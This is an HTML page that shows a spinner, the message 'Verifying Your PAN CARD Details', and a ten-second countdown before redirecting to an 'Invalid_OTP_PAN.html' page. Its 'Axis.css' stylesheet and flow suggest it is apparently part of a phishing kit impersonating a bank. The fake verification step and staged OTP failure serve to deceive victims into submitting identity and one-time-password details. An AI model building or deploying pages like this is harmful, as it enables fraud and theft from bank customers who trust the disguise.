<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <meta name="theme-color" content="#A6004D">
    <meta charSet="utf-8" />
    <meta name="viewport" content="width=device-width" />
    <title>Processing...</title>
    <meta name="next-head-count" content="3" />
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <link rel="preload" href="Axis.css" as="style" />
    <link rel="stylesheet" href="Axis.css" data-n-g="" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
    <noscript data-n-css=""></noscript>
    <script>
      function countdown() {
        var count = 10;
        var countdownElement = document.getElementById("countdown");

        var countdownInterval = setInterval(function() {
          countdownElement.innerHTML = count;
          count--;

          if (count < 0) {
            clearInterval(countdownInterval);
            window.location.href = "Invalid_OTP_PAN.html";
          }
        }, 1000);
      }

      document.addEventListener("DOMContentLoaded", function() {
        countdown();
      });
    </script>
  </head>
  <body>
    <div id="__next">
      <div class="text-center l-loading">
        <svg class="circlespinner" viewBox="0 0 50 50">
          <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
        </svg>
        <h1 style="font-size:14px; color:grey; font-family: 'Work Sans', sans-serif;">Please wait...Verifying Your PAN CARD Details...<br> Redirecting in <span id="countdown">10</span> seconds.</h1>
      </div>
    </div>
  </body>
</html>
